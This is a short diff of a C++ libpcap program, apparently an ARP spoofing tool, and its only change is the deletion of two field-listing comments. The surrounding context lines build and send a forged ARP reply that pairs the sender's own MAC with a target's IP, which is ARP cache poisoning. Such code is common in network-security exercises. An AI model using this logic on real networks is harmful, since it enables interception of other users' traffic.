@@ -90,7 +90,6 @@ int main(int argc, char* argv[]) {
 
 	// create arp packet
 	EthArpPacket packet; // packet template
-	// destination MAC address, attacker MAC address, attacker IP address, target MAC address, target IP address, type(request = 1, reply = 2)
 	packet = packet_make(Mac("ff:ff:ff:ff:ff:ff"), my_Mac, my_Mac, Mac("00:00:00:00:00:00"), my_Ip, senderIp, 1); // request packet to victim
 	// send arp packet 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
@@ -127,7 +126,6 @@ int main(int argc, char* argv[]) {
 
 	// create arp packet
 	Mac sender_mac = Mac(recvPacket->arp_.smac_); // sender mac address from arp reply 
-	// destination MAC address, attacker MAC address, attacker IP address, target MAC address, target IP address, type(request = 1, reply = 2)
 	packet = packet_make(sender_mac, my_Mac, my_Mac, sender_mac, targetIp, senderIp, 2); // reply packet to target
 	// send arp packet
 	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
